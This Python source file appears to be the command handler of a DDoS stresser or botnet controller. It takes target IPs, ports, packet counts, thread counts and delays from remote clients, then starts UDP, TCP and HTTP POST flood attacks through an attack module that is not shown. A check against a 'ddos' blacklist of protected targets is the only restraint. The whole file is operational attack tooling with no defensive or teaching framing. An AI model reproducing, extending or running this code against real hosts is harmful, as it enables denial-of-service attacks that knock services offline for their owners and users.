from modules.payload import Attacks
from modules.functions import data, config, helpText, CLEAR

from socket import socket
from time import sleep
from threading import Thread


class Commands:
  def __init__(self) -> None:
    self.attacks: Attacks = Attacks()
    self.data: data = data()
    self.config: config = config()

  def udp(self, server: socket, data: list[str, str]) -> None:
    print(f"{data[0]}: Used udp")
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    ip: str = str(self.data.recieve(server))
    blacklisted = False
    for x in self.config.blacklist["ddos"]:
      if str(ip).__contains__(x):
        print("BLACKLISTED IP")
        blacklisted: bool = True
    print(f"{data[0]}: IP -> {ip}")
    
    port: int = int(self.data.recieve(server))
    print(f"{data[0]}: PORT -> {port}")

    tries: int = int(self.data.recieve(server))
    print(f"{data[0]}: TRIES -> {tries}")

    packets: int = int(self.data.recieve(server))
    print(f"{data[0]}: PACKETS -> {packets}")

    repack: int = int(self.data.recieve(server))
    print(f"{data[0]}: MULTIPLIER -> {repack}")

    trydelay: int = int(self.data.recieve(server))
    print(f"{data[0]}: TRY DELAY -> {trydelay}")

    senddelay: int = int(self.data.recieve(server))
    print(f"{data[0]}: SEND DELAY -> {senddelay}")

    size: int = int(self.data.recieve(server))
    print(f"{data[0]}: SIZE -> {size}")

    threads: int = int(self.data.recieve(server))
    print(f"{data[0]}: THREADS -> {threads}")
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    sleep(0.1)
    Thread(target=self.attacks.udpAttack, args=(blacklisted, server, ip, port, tries, packets, repack, trydelay, senddelay, size, threads)).start()
  
  def tcp(self, server: socket, data: list[str, str]) -> None:
    print(f"{data[0]}: Used tcp")
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    ip: str = str(self.data.recieve(server))
    blacklisted = False
    for x in self.config.blacklist["ddos"]:
      if str(ip).__contains__(x):
        print("BLACKLISTED IP")
        blacklisted: bool = True
    print(f"{data[0]}: IP -> {ip}")
    
    port: int = int(self.data.recieve(server))
    print(f"{data[0]}: PORT -> {port}")

    tries: int = int(self.data.recieve(server))
    print(f"{data[0]}: TRIES -> {tries}")

    packets: int = int(self.data.recieve(server))
    print(f"{data[0]}: PACKETS -> {packets}")

    repack: int = int(self.data.recieve(server))
    print(f"{data[0]}: MULTIPLIER -> {repack}")

    trydelay: int = int(self.data.recieve(server))
    print(f"{data[0]}: TRY DELAY -> {trydelay}")

    senddelay: int = int(self.data.recieve(server))
    print(f"{data[0]}: SEND DELAY -> {senddelay}")

    size: int = int(self.data.recieve(server))
    print(f"{data[0]}: SIZE -> {size}")

    threads: int = int(self.data.recieve(server))
    print(f"{data[0]}: THREADS -> {threads}")
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    sleep(0.1)
    Thread(target=self.attacks.tcpAttack, args=(blacklisted, server, ip, port, tries, packets, repack, trydelay, senddelay, size, threads)).start()
  
  def post(self, server: socket, data: list[str, str]) -> None:
    print(f"{data[0]}: Used post")
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    url: str = str(self.data.recieve(server))
    blacklisted = False
    for x in self.config.blacklist["ddos"]:
      if str(url).__contains__(x):
        print("BLACKLISTED URL")
        blacklisted: bool = True
    print(f"{data[0]}: URL -> {url}")

    packets: int = int(self.data.recieve(server))
    print(f"{data[0]}: PACKETS -> {packets}")

    repack: int = int(self.data.recieve(server))
    print(f"{data[0]}: MULTIPLIER -> {repack}")

    senddelay: int = int(self.data.recieve(server))
    print(f"{data[0]}: SEND DELAY -> {senddelay}")

    size: int = int(self.data.recieve(server))
    print(f"{data[0]}: SIZE -> {size}")

    threads: int = int(self.data.recieve(server))
    print(f"{data[0]}: THREADS -> {threads}")
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    sleep(0.1)
    Thread(target=self.attacks.postAttack, args=(blacklisted, server, url, packets, repack, senddelay, size, threads)).start()
  
  
  
  def ping(self, server: socket, data: list[str, str]) -> None:
    print(f"{data[0]}: Used ping")
    self.data.send(server, f"{CLEAR}Pong!")

  def help(self, server: socket, data: list[str, str]) -> None:
    print(f"{data[0]}: Used help")
    self.data.send(server, helpText())